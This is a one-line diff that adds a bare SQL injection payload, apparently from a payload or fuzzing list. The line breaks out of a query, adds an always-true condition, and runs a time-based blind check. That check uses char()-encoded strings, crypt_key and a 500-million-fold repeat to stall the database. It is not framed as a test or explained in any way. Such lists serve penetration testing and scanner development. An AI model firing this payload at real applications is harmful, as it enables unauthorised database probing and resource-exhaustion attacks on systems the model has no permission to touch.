@@ -1,0 +1,1 @@
+1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
